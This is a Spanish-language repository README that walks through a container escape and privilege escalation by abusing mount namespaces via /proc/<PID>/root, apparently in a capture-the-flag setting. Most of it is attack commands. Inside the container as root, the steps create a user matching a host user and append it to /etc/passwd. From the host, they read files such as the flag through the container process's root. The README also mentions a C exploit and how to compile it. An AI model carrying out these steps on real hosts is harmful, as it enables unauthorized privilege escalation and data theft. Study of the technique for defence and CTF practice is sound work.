# Abusing mount namespaces through /proc/<PID>/root

En este repositorio vengo a automatizar la tecnica de los espacios de nombres para escapar de un Docker y elevar privilegios/sacar la flag/dumpear data, etcetera. Pueden leer con mas detalle esta tecnica [aqui](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot). Para poder realizar esta tecnica con exito necesitas cumplir los siguientes requisitos.

- Shell como usuario no privilgiado en el host
- Shell como root en el Docker.

Explotacion:

**Los siguientes pasos debes correrlos en el Docker como root.**

``` shell
useradd luk4s # Este usuario debe existir en la maquina host.
usermod -aG luk4s luk4s
echo "luk4s:x:1000:1000:luk4s:/home/luk4s:/bin/bash" >> /etc/passwd # El contenido lo podemos sacar de la maquina hosts utilizando -> grep luk4s /etc/paswd
su luk4s
/bin/sh # Este comando lo ejecutamos cuando ganamos shell como luk4s en el contenedor
```

Con esto ya tenemos listo el trabajo en el contenedor.

**Los siguientes comandos debes ejecutarlo de la maquina hosts.**

``` shell
ps aux | grep sh # Vas a notar un proceso que corre tu usuario con una sh, este fue el proceso que creaste tu en el contenedor
grep -a "flag" /proc/<pid>/root/sda
```

PoC:

![](https://i.imgur.com/k1kJVE2.png)

## Automation

Programe un script en C el cual automatiza los pasos a seguir en el contenedor, si quieren usar el binario lo compilan utilizando `gcc` y lo suben al Docker.

``` shell
gcc exploit.c -o exploit
```

Thanks for reading :)
